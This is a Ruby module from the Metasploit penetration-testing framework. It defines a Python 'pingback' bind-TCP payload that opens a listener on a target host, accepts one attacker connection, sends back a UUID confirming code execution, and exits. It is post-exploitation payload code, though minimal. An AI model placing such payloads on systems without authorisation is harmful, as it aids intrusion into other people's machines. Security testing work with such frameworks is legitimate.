module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Payload::Pingback
  include Msf::Payload::Pingback::Options

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Python Pingback, Bind TCP (via python)',
        'Description' => 'Listens for a connection from the attacker, sends a UUID, then terminates',
        'Author' => 'asoto-r7',
        'License' => MSF_LICENSE,
        'Platform' => 'python',
        'Arch' => ARCH_PYTHON,
        'Handler' => Msf::Handler::BindTcp,
        'Session' => Msf::Sessions::Pingback,
        'PayloadType' => 'python'
      )
    )
  end

  def generate(_opts = {})
    super.to_s + command_string
  end

  def command_string
    self.pingback_uuid ||= generate_pingback_uuid
    cmd = <<~PYTHON
      import binascii as b
      import socket as s
      o=s.socket(s.AF_INET,s.SOCK_STREAM)
      try:
       o.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
       o.bind(('0.0.0.0', #{datastore['LPORT']}))
       o.listen(1)
       o,addr=o.accept()
       o.send(b.a2b_base64('#{[[self.pingback_uuid].pack('H*')].pack('m0')}'))
       o.close()
      except:
       pass
    PYTHON

    py_create_exec_stub(cmd)
  end
end
